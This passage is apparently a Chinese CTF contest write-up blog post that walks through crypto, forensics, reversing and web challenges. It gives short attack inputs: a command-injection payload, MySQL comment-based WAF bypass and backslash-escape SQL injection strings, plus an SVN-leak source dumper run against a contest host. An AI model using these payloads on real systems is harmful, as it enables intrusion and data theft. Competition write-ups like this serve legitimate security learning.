title="moudle"></a>moudle</h3><p>其实题目名字已经提示了很多了，但是。。我在赛场上竟然蠢的只看了其中一个公钥文件0 0，然后GG。常规思路，用rsatools跑了一下，发现没有任何信息，赛后得知其实RSA共模攻击，0 0蠢的想扇死自己。。。</p><h3 id="findme"><a href="#findme" class="headerlink" title="findme"></a>findme</h3><p>比较良心，没去掉后缀名，用winhex转换磁盘镜像获得磁盘回收站内的zip文件，然后需要解密ORZ，以为是伪加密，但是不存在的，010打开，发现zip文件末尾存在额外数据，尝试用gbk解码，发现提示。用工具很快就能爆破出密码。stegslove打开，在其额外数据段发现其内存在flag= = </p><h3 id="pyc"><a href="#pyc" class="headerlink" title="pyc"></a>pyc</h3><p>使用GitTools恢复出了四个历史文件夹，其中两个里面发现了存在数据，一个是pyc文件，还有一个压缩包，不知道干嘛的，010打开pyc文件，发现有密码，一开始没有在意，用常规思路，去逆向pyc，发现不存在的，后来试着用刚刚发现的密码去解压压缩文件，发现有现成的攻击可以跑。。。ORZ<br>跑出来就是flag</p><h3 id="pcap"><a href="#pcap" class="headerlink" title="pcap"></a>pcap</h3><p>用<code>NetworkMiner</code>提取数据，发现存在几个图片文件和一个密文，提示是aes，尝试用aes去破解，获得png数据，生成图片后，扫码获得flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">key = <span class="string">b'EaRncVfLgIPMaygA'</span></div><div class="line">iv = <span class="string">b'HDkMsMEzkkzyQLTH'</span></div><div class="line">cipher = AES.new(key, AES.MODE_ECB, iv)</div><div class="line">msg = iv + base64.b64decode(<span class="string">"kWZnRZMZv9JJLcD4v6o19iFKHOhc/S1Dv5y3r2YxhnRuWE8w/ji0jr0VFAGDbfzyQLcONBtB6pjetkHggUPv/rUmXoSfTnnWJ/cfv9deT56KoxwtXMGO4LJyXakTPE2tMcu0UexsnlhfhlqUE2vGnNnNUm996thkRlp3v36OfwgVGfT22UVjv+lpk0lKXgT2liQm/eBRilEaPw4o6P29YV7zN3AqI2y5Sa+I13o53cwO9JNOCXC28wuYSBrbOauu61VGj9MroQ3Si5swvx4p8vzyZZd5SkjIJ69AFi6pGPxnptofigIS5NRvVYLady+n0IWDj32whAPinOHcB8t3qJH1YtwNf9ly7gFQUgqCEXXDuRTcercMxe72siNNtg1LZTVQJLViD4G1ROdrh9Lic2BTe/9mAt/mKeRIaXJDHrTTu/d6xao4P995xjhSAhkD+cgbuOCgwhkpVH6cyRR+aFKFBv6UVZzob4s7ul9Xjzc9ETBaoE8CoAXLSZ5zEGs0jEbL0Hf5SdenlISyny97BFnqiGXRQCwBIacq+ytw/VK6DC2ddHAOndZ5K/zmnE0WuccCDTQ8gskaswFpbSG4q47HaN8t/VNug4NfZSGE/kbf+rW7QGlwMF66ksxhpthlkXJkICbpgnHNwsAjZnDhN1t9SDms4EIbozHaopiH79gy+h3N8lk/85OJfM0rac5CGcFlO9Tgf0ov6cGe8ABTIw1tFKZIcXWqETIbl60WCgBxmJFsBbl0ikDDyTsxSn8cNK8bVymqmL5TuTM2clBhd/rV44nA5vCGAnEKzfEHoV3YFc4gik8/nUutDmxJdjeqrd7M0Lm0QKpVPl8ATA5Tf2PKTJ9CaxIiLyazY74D2egqYZzddjq4aXXNPWgwYk5OKAZz+avRMJWu+ACx0wlih0ScOor4PMbpRqSc8oEjmeg="</span>)</div><div class="line">cipher.decrypt(msg)</div></pre></td></tr></table></figure><h3 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h3><p>按照提示做出来的，本来可以用find命令查最近修改文件的日期来获取信息，但是命令忘了，又不能够连接网络ORZ。。。提示是存在后门。grep一下eval(找到后门文件，接下来常规思路。(赛后得知可以用killshell来快速查找后门的，找后门的还有几个工具，有时间得拿出来比较实验以下~web弱渣了ORZ)</p><h3 id="Replace"><a href="#Replace" class="headerlink" title="Replace"></a>Replace</h3><p>解压缩包密码的过程就不说了吧，很无聊</p><p>直接upx解壳，<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">a = [<span class="number">0x63</span>,<span class="number">0x7C</span>,<span class="number">0x77</span>,<span class="number">0x7B</span>,<span class="number">0x0F2</span>,<span class="number">0x6B</span>,<span class="number">0x6F</span>,<span class="number">0x0C5</span>,<span class="number">0x30</span>,<span class="number">0x1</span>,<span class="number">0x67</span>,<span class="number">0x2B</span>,<span class="number">0x0FE</span>,<span class="number">0x0D7</span>,<span class="number">0x0AB</span>,<span class="number">0x76</span>,<span class="number">0x0CA</span>,<span class="number">0x82</span>,<span class="number">0x0C9</span>,<span class="number">0x7D</span>,<span class="number">0x0FA</span>,<span class="number">0x59</span>,<span class="number">0x47</span>,<span class="number">0x0F0</span>,<span class="number">0x0AD</span>,<span class="number">0x0D4</span>,<span class="number">0x0A2</span>,<span class="number">0x0AF</span>,<span class="number">0x9C</span>,<span class="number">0x0A4</span>,<span class="number">0x72</span>,<span class="number">0x0C0</span>,<span class="number">0x0B7</span>,<span class="number">0x0FD</span>,<span class="number">0x93</span>,<span class="number">0x26</span>,<span class="number">0x36</span>,<span class="number">0x3F</span>,<span class="number">0x0F7</span>,<span class="number">0x0CC</span>,<span class="number">0x34</span>,<span class="number">0x0A5</span>,<span class="number">0x0E5</span>,<span class="number">0x0F1</span>,<span class="number">0x71</span>,<span class="number">0x0D8</span>,<span class="number">0x31</span>,<span class="number">0x15</span>,<span class="number">0x4</span>,<span class="number">0x0C7</span>,<span class="number">0x23</span>,<span class="number">0x0C3</span>,<span class="number">0x18</span>,<span class="number">0x96</span>,<span class="number">0x5</span>,<span class="number">0x9A</span>,<span class="number">0x7</span>,<span class="number">0x12</span>,<span class="number">0x80</span>,<span class="number">0x0E2</span>,<span class="number">0x0EB</span>,<span class="number">0x27</span>,<span class="number">0x0B2</span>,<span class="number">0x75</span>,<span class="number">0x9</span>,<span class="number">0x83</span>,<span class="number">0x2C</span>,<span class="number">0x1A</span>,<span class="number">0x1B</span>,<span class="number">0x6E</span>,<span class="number">0x5A</span>,<span class="number">0x0A0</span>,<span class="number">0x52</span>,<span class="number">0x3B</span>,<span class="number">0x0D6</span>,<span class="number">0x0B3</span>,<span class="number">0x29</span>,<span class="number">0x0E3</span>,<span class="number">0x2F</span>,<span class="number">0x84</span>,<span class="number">0x53</span>,<span class="number">0x0D1</span>,<span class="number">0x0</span>,<span class="number">0x0ED</span>,<span class="number">0x20</span>,<span class="number">0x0FC</span>,<span class="number">0x0B1</span>,<span class="number">0x5B</span>,<span class="number">0x6A</span>,<span class="number">0x0CB</span>,<span class="number">0x0BE</span>,<span class="number">0x39</span>,<span class="number">0x4A</span>,<span class="number">0x4C</span>,<span class="number">0x58</span>,<span class="number">0x0CF</span>,<span class="number">0x0D0</span>,<span class="number">0x0EF</span>,<span class="number">0x0AA</span>,<span class="number">0x0FB</span>,<span class="number">0x43</span>,<span class="number">0x4D</span>,<span class="number">0x33</span>,<span class="number">0x85</span>,<span class="number">0x45</span>,<span class="number">0x0F9</span>,<span class="number">0x2</span>,<span class="number">0x7F</span>,<span class="number">0x50</span>,<span class="number">0x3C</span>,<span class="number">0x9F</span>,<span class="number">0x0A8</span>,<span class="number">0x51</span>,<span class="number">0x0A3</span>,<span class="number">0x40</span>,<span class="number">0x8F</span>,<span class="number">0x92</span>,<span class="number">0x9D</span>,<span class="number">0x38</span>,<span class="number">0x0F5</span>,<span class="number">0x0BC</span>,<span class="number">0x0B6</span>,<span class="number">0x0DA</span>,<span class="number">0x21</span>,<span class="number">0x10</span>,<span class="number">0x0FF</span>,<span class="number">0x0F3</span>,<span class="number">0x0D2</span>,<span class="number">0x0CD</span>,<span class="number">0x0C</span>,<span class="number">0x13</span>,<span class="number">0x0EC</span>,<span class="number">0x5F</span>,<span class="number">0x97</span>,<span class="number">0x44</span>,<span class="number">0x17</span>,<span class="number">0x0C4</span>,<span class="number">0x0A7</span>,<span class="number">0x7E</span>,<span class="number">0x3D</span>,<span class="number">0x64</span>,<span class="number">0x5D</span>,<span class="number">0x19</span>,<span class="number">0x73</span>,<span class="number">0x60</span>,<span class="number">0x81</span>,<span class="number">0x4F</span>,<span class="number">0x0DC</span>,<span class="number">0x22</span>,<span class="number">0x2A</span>,<span class="number">0x90</span>,<span class="number">0x88</span>,<span class="number">0x46</span>,<span class="number">0x0EE</span>,<span class="number">0x0B8</span>,<span class="number">0x14</span>,<span class="number">0x0DE</span>,<span class="number">0x5E</span>,<span class="number">0x0B</span>,<span class="number">0x0DB</span>,<span class="number">0x0E0</span>,<span class="number">0x32</span>,<span class="number">0x3A</span>,<span class="number">0x0A</span>,<span class="number">0x49</span>,<span class="number">0x6</span>,<span class="number">0x24</span>,<span class="number">0x5C</span>,<span class="number">0x0C2</span>,<span class="number">0x0D3</span>,<span class="number">0x0AC</span>,<span class="number">0x62</span>,<span class="number">0x91</span>,<span class="number">0x95</span>,<span class="number">0x0E4</span>,<span class="number">0x79</span>,<span class="number">0x0E7</span>,<span class="number">0x0C8</span>,<span class="number">0x37</span>,<span class="number">0x6D</span>,<span class="number">0x8D</span>,<span class="number">0x0D5</span>,<span class="number">0x4E</span>,<span class="number">0x0A9</span>,<span class="number">0x6C</span>,<span class="number">0x56</span>,<span class="number">0x0F4</span>,<span class="number">0x0EA</span>,<span class="number">0x65</span>,<span class="number">0x7A</span>,<span class="number">0x0AE</span>,<span class="number">0x8</span>,<span class="number">0x0BA</span>,<span class="number">0x78</span>,<span class="number">0x25</span>,<span class="number">0x2E</span>,<span class="number">0x1C</span>,<span class="number">0x0A6</span>,<span class="number">0x0B4</span>,<span class="number">0x0C6</span>,<span class="number">0x0E8</span>,<span class="number">0x0DD</span>,<span class="number">0x74</span>,<span class="number">0x1F</span>,<span class="number">0x4B</span>,<span class="number">0x0BD</span>,<span class="number">0x8B</span>,<span class="number">0x8A</span>,<span class="number">0x70</span>,<span class="number">0x3E</span>,<span class="number">0x0B5</span>,<span class="number">0x66</span>,<span class="number">0x48</span>,<span class="number">0x3</span>,<span class="number">0x0F6</span>,<span class="number">0x0E</span>,<span class="number">0x61</span>,<span class="number">0x35</span>,<span class="number">0x57</span>,<span class="number">0x0B9</span>,<span class="number">0x86</span>,<span class="number">0x0C1</span>,<span class="number">0x1D</span>,<span class="number">0x9E</span>,<span class="number">0x0E1</span>,<span class="number">0x0F8</span>,<span class="number">0x98</span>,<span class="number">0x11</span>,<span class="number">0x69</span>,<span class="number">0x0D9</span>,<span class="number">0x8E</span>,<span class="number">0x94</span>,<span class="number">0x9B</span>,<span class="number">0x1E</span>,<span class="number">0x87</span>,<span class="number">0x0E9</span>,<span class="number">0x0CE</span>,<span class="number">0x55</span>,<span class="number">0x28</span>,<span class="number">0x0DF</span>,<span class="number">0x8C</span>,<span class="number">0x0A1</span>,<span class="number">0x89</span>,<span class="number">0x0D</span>,<span class="number">0x0BF</span>,<span class="number">0x0E6</span>,<span class="number">0x42</span>,<span class="number">0x68</span>,<span class="number">0x41</span>,<span class="number">0x99</span>,<span class="number">0x2D</span>,<span class="number">0x0F</span>,<span class="number">0x0B0</span>,<span class="number">0x54</span>,<span class="number">0x0BB</span>,<span class="number">0x16</span>]</div><div class="line">b = <span class="string">"bb3ccfb0213965aed24b9264ae4bbb92543954bb0739bbbbcf64f554cff5f365f565f386"</span>.decode(<span class="string">"hex"</span>)</div><div class="line"></div><div class="line">flag = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> b:</div><div class="line">    d = ord(x) ^ <span class="number">0x88</span></div><div class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">0x0</span>,<span class="number">0xff</span>):</div><div class="line">        <span class="comment"># print (y &amp;0xf)+(y &gt;&gt; 4)*2</span></div><div class="line">        <span class="keyword">if</span> a[(y &gt;&gt; <span class="number">4</span>)+<span class="number">8</span>*((y &amp;<span class="number">0xf</span>)*<span class="number">2</span>)] == d:</div><div class="line">            flag += chr(y)</div><div class="line">            <span class="keyword">break</span></div><div class="line"><span class="keyword">print</span> flag</div><div class="line"></div><div class="line"><span class="comment"># flag&#123;e52d34823f49e9f7effa819a105150&#125;</span></div></pre></td></tr></table></figure></p><h3 id="送分题"><a href="#送分题" class="headerlink" title="送分题"></a>送分题</h3><p>web弱渣就算碰到送分题也不会啊，通过提示和提供的密码本，原来考察点是在于弱口令ORZ （好吧，服了，一直拿sql在注，返回速度还特别慢），用burp加载top 10 password（原来还有这种东西），爆破登录界面得到flag。</p><h3 id="code"><a href="#code" class="headerlink" title="code"></a>code</h3><p>秒做的题目, payload <code>127.0.0.1;cat flag</code> 命令执行绕过有很多姿势，但遗憾的是这边没有过滤。 </p><h3 id="waf"><a href="#waf" class="headerlink" title="waf"></a>waf</h3><p>waf这题题目其实一开始也不会的，也是通过提示来过的，黑盒测试发现waf拦截许多东西，最为关键的就是 union select，所以想办法绕过，经过N次测试，发现<code>/*!50000select*/</code> 不会被waf拦截，于是构造<code>%27/*!50000union*/%0a/*!50000select*/%0aflag%0a/*!50000from*/flag%23</code> 得到flag</p><h3 id="blog"><a href="#blog" class="headerlink" title="blog"></a>blog</h3><p>好像是叫这个名字？忘了，赛后听说是admin，密码是123456，然后进去一系列骚操作获取flag，又是考弱口令啊啊啊啊啊啊</p><h3 id="markdown"><a href="#markdown" class="headerlink" title="markdown"></a>markdown</h3><p>也是赛后得知的，考察通过markdown的ssrf来获取信息，语法是<code>![](flag.php)</code>，flag的文件名需要通过robots.txt文件来获取，构造即可从源码中获得到flag信息。</p><h3 id="box"><a href="#box" class="headerlink" title="box"></a>box</h3><p>也是赛后得知的，听说是全国大学生信安赛的<code>wanna to see your hat</code> ,（蜜汁微笑，技术支持真懒）。不过作为biner，当时比赛的时候，没去碰这题题目，没做出来，认了。。。。赛后复现如下。</p><p>拿weakfilescan扫描以下敏感文件，发现存在svn泄漏。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">--------------------------------------------------</div><div class="line">* scan http://123.59.52.228:1515 start</div><div class="line">--------------------------------------------------</div><div class="line">[200] http://123.59.52.228:1515 =&gt; http://123.59.52.228:1515/route.php?act=index</div><div class="line">[200] http://123.59.52.228:1515/.svn/entries =&gt; http://123.59.52.228:1515/.svn/entries</div><div class="line">--------------------------------------------------</div><div class="line">* scan complete...</div><div class="line">--------------------------------------------------</div><div class="line">&#123;</div><div class="line">  &quot;dirs&quot;: &#123;</div><div class="line">    &quot;http://123.59.52.228:1515&quot;: [</div><div class="line">      &quot;http://123.59.52.228:1515/&quot;</div><div class="line">    ]</div><div class="line">  &#125;, </div><div class="line">  &quot;files&quot;: &#123;</div><div class="line">    &quot;http://123.59.52.228:1515&quot;: &#123;</div><div class="line">      &quot;/.svn/&quot;: [</div><div class="line">        &quot;http://123.59.52.228:1515/.svn/entries&quot;</div><div class="line">      ]</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>使用svn.py将源码dump下来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python      </span></div><div class="line"><span class="comment">#coding:utf-8</span></div><div class="line">__author__ = <span class="string">'Rivir'</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"> </div><div class="line"><span class="keyword">print</span> <span class="string">'''</span></div><div class="line"> ----</div><div class="line">    _____               ______            __    </div><div class="line">  / ___/   ______     /_  __/___  ____  / /____</div><div class="line">  \__ \ | / / __ \     / / / __ \/ __ \/ / ___/</div><div class="line"> ___/ / |/ / / / /    / / / /_/ / /_/ / (__  ) </div><div class="line">/____/|___/_/ /_/    /_/  \____/\____/_/____/  </div><div class="line">                author: Rivir</div><div class="line"> ----</div><div class="line">\                             .       .</div><div class="line"> \                           / `.   .' " </div><div class="line">  \                  .---.  &lt;    &gt; &lt;    &gt;  .---.</div><div class="line">   \                 |    \  \ - ~ ~ - /  /    |</div><div class="line">         _____          ..-~             ~-..-~</div><div class="line">        |     |   \~~~\.'                    `./~~~/</div><div class="line">       ---------   \__/                        \__/</div><div class="line">      .'  O    \     /               /       \  " </div><div class="line">     (_____,    `._.'               |         &#125;  \/~~~/</div><div class="line">      `----.          /       &#125;     |        /    \__/</div><div class="line">            `-.      |       /      |       /      `. ,~~|</div><div class="line">                ~-.__|      /_ - ~ ^|      /- _      `..-'   </div><div class="line">                     |     /        |     /     ~-.     `-. _  _  _</div><div class="line">                     |_____|        |_____|         ~ - . _ _ _ _ _&gt;</div><div class="line"> </div><div class="line">'''</div><div class="line"> </div><div class="line">headers = &#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0'</span>&#125;</div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getfilename</span><span class="params">(url)</span>:</span></div><div class="line">    <span class="keyword">with</span> open(<span class="string">'wc.db'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</div><div class="line">        content = requests.get(url=url+<span class="string">'/.svn/wc.db'</span>,headers=headers).content</div><div class="line">        f.write(content)</div><div class="line"> </div><div class="line">    <span class="keyword">with</span> open(<span class="string">'svn.txt'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> file:</div><div class="line">        info = os.popen(<span class="string">"""sqlite3 wc.db 'select local_relpath, ".svn/pristine/" || substr(checksum,7,2) || "/" || substr(checksum,7) || ".svn-base" as alpha from NODES;'"""</span>).read()</div><div class="line">        <span class="comment">#print info</span></div><div class="line">        file.write(info)</div><div class="line"> </div><div class="line">    os.remove(<span class="string">'wc.db'</span>)</div><div class="line"> </div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">restore_svn</span><span class="params">(url)</span>:</span></div><div class="line">    getfilename(url)</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">'./svn'</span>):</div><div class="line">        os.mkdir(<span class="string">'svn'</span>)</div><div class="line">    <span class="keyword">with</span> open(<span class="string">'svn.txt'</span>) <span class="keyword">as</span> f:</div><div class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> f:</div><div class="line">            tmp = file.strip().split(<span class="string">'|'</span>)</div><div class="line">            <span class="comment">#print tmp</span></div><div class="line">            <span class="keyword">if</span> len(tmp) == <span class="number">1</span>:</div><div class="line">                <span class="keyword">continue</span></div><div class="line">            name = tmp[<span class="number">0</span>]</div><div class="line">            path = tmp[<span class="number">1</span>]</div><div class="line">            <span class="keyword">if</span> <span class="string">'/'</span> <span class="keyword">in</span> name:</div><div class="line">                book = os.path.dirname(name)</div><div class="line">                <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">'./svn/'</span>+book):</div><div class="line">                    os.makedirs(<span class="string">'./svn/'</span>+book)</div><div class="line"> </div><div class="line"> </div><div class="line">            <span class="keyword">print</span> <span class="string">'download:'</span>,<span class="string">'./svn/'</span>+name</div><div class="line">            <span class="keyword">try</span>:</div><div class="line">                <span class="keyword">with</span> open(<span class="string">'./svn/'</span>+name,<span class="string">'w'</span>) <span class="keyword">as</span> f:</div><div class="line">                    req = requests.get(url+path,headers=headers)</div><div class="line">                    f.write(req.content)</div><div class="line">            <span class="keyword">except</span> Exception,e:</div><div class="line">                <span class="comment">#print e </span></div><div class="line">                <span class="keyword">pass</span></div><div class="line"> </div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    restore_svn(sys.argv[<span class="number">-1</span>])</div></pre></td></tr></table></figure><p>发现flag.php文件，然而并没有什么软用。发现<code>index.php</code>中，如果<code>$_SESSION[&quot;hat&quot;]</code> == <code>&quot;black&quot;</code> 会输出flag，所以我们希望找到一个地方，这个地方是给<code>$_SESSION[&quot;hat&quot;]</code>赋予<code>&quot;black&quot;</code>字符串的，我们在login.php中找到了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">   $sql = <span class="string">"select count(*) from t_info where username = '$name' or nickname = '$name'"</span>;</div><div class="line">   <span class="keyword">echo</span> $sql;</div><div class="line">   $result = mysql_query($sql);</div><div class="line">   $row = mysql_fetch_array($result);</div><div class="line">   <span class="keyword">if</span> ($row[<span class="number">0</span>])&#123;</div><div class="line">     $_SESSION[<span class="string">'hat'</span>] = <span class="string">'black'</span>;</div><div class="line">     <span class="keyword">echo</span> <span class="string">'good job'</span>;</div><div class="line">   &#125;<span class="keyword">else</span>&#123;</div><div class="line">$_SESSION[<span class="string">'hat'</span>] = <span class="string">'green'</span>;</div><div class="line">   &#125;</div></pre></td></tr></table></figure><p>这边有个坑，reg那个页面中所用的表和login页面中登录的表不一样。。所以无论怎么注册都没用，需要选手绕过waf来注入。。。</p><p>waf规则</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">$name = str_replace(<span class="string">"'"</span>, <span class="string">""</span>, trim(waf($_POST[<span class="string">"name"</span>])));</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($value)</span></span>&#123;</div><div class="line">    $Filt = <span class="string">"\bUNION.+SELECT\b|SELECT.+?FROM"</span>;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$Filt.<span class="string">"/is"</span>,$value)==<span class="number">1</span>)&#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">"found a hacker"</span>);</div><div class="line">    &#125;</div><div class="line">    $value = str_replace(<span class="string">" "</span>,<span class="string">""</span>,$value);  </div><div class="line">    <span class="keyword">return</span> $value;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>$_POST首先会被全局转义，故而会多出个反斜杠，这边waf替换掉了单引号，但是没有替换掉反斜杠，导致反斜杠的特殊利用。</p><p><code>select count(*) from t_info where username = &#39;||1#\&#39; or nickname = &#39;||1#\&#39;</code></p><p>转到index页面获取flag</p><h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><p>???这waf太强啦，真不会啊~</p><p>跪求大佬的wp</p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>此次比赛网络环境确实不是很好，所以对于做离线题目的选手要有利的多，离线的环境。做web题的时候，用weakfilescan来发现敏感文件，发现这玩意不支持302，真坑啊。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;还好这次比赛网络环境比较差，主办方被迫放了许多离线题，让我这只bin dog有机可乘（手动滑稽），但这次比赛也确实发现自身的web能力有限，对于一些简单的web题竟然出现无从下手的情况。。也借这次比赛总结下离线环境下一些特殊操作吧。&lt;/p&gt;
&lt;h3 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerlink&quot; title=&quot;正文&quot;&gt;&lt;/a&gt;正文&lt;/h3&gt;&lt;p&gt;对于一些密码类的题目，手头有合适的工具最好了，但很多情况下，工具并不适用，比如这次比赛中，出现的aes解密，不清楚加密模式，需要输入iv和key，而手头的工具只可以输入key，且加密模式确定，没办法，只能去找库，不过比较幸运的是，之前安装过一个crypt的python库，看里面的源码，竟然有aes加密的说明，简单的倒推一下就能够推出解密脚本。&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; Crypto.Cipher &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; AES&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;key = &lt;span class=&quot;string&quot;&gt;b&#39;EaRncVfLgIPMaygA&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;iv = &lt;span class=&quot;string&quot;&gt;b&#39;HDkMsMEzkkzyQLTH&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cipher = AES.new(key, AES.MODE_CBC, iv)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;msg = iv + base64.b64decode(&lt;span class=&quot;string&quot;&gt;&quot;kWZnRZMZv9JJLcD4v6o19iFKHOhc/S1Dv5y3r2YxhnRuWE8w/ji0jr0VFAGDbfzyQLcONBtB6pjetkHggUPv/rUmXoSfTnnWJ/cfv9deT56KoxwtXMGO4LJyXakTPE2tMcu0UexsnlhfhlqUE2vGnNnNUm996thkRlp3v36OfwgVGfT22UVjv+lpk0lKXgT2liQm/eBRilEaPw4o6P29YV7zN3AqI2y5Sa+I13o53cwO9JNOCXC28wuYSBrbOauu61VGj9MroQ3Si5swvx4p8vzyZZd5SkjIJ69AFi6pGPxnptofigIS5NRvVYLady+n0IWDj32whAPinOHcB8t3qJH1YtwNf9ly7gFQUgqCEXXDuRTcercMxe72siNNtg1LZTVQJLViD4G1ROdrh9Lic2BTe/9mAt/mKeRIaXJDHrTTu/d6xao4P995xjhSAhkD+cgbuOCgwhkpVH6cyRR+aFKFBv6UVZzob4s7ul9Xjzc9ETBaoE8CoAXLSZ5zEGs0jEbL0Hf5SdenlISyny97BFnqiGXRQCwBIacq+ytw/VK6DC2ddHAOndZ5K/zmnE0WuccCDTQ8gskaswFpbSG4q47HaN8t/VNug4NfZSGE/kbf+rW7QGlwMF66ksxhpthlkXJkICbpgnHNwsAjZnDhN1t9SDms4EIbozHaopiH79gy+h3N8lk/85OJfM0rac5CGcFlO9Tgf0ov6cGe8ABTIw1tFKZIcXWqETIbl60WCgBxmJFsBbl0ikDDyTsxSn8cNK8bVymqmL5TuTM2clBhd/rV44nA5vCGAnEKzfEHoV3YFc4gik8/nUutDmxJdjeqrd7M0Lm0QKpVPl8ATA5Tf2PKTJ9CaxIiLyazY74D2egqYZzddjq4aXXNPWgwYk5OKAZz+avRMJWu+ACx0wlih0ScOor4PMbpRqSc8oEjmeg=&quot;&lt;/span&gt;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cipher.decrypt(msg)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;对于zip压缩包，还是archpr好用。。&lt;/p&gt;
&lt;p&gt;对于web弱口令还需要准备一本字典，其实早就应该准备了，包括一些bypass waf的字典，网站扫描的字典，经过这次比赛，发现对于web题而言，字典是多么重要。&lt;/p&gt;
&lt;p&gt;对于线下赛，webshellkill是一款好工具，可以直接利用其来找容易发现的一句话后门。（不过自己也需要写一个利用命令执行自动种马的脚本）&lt;/p&gt;
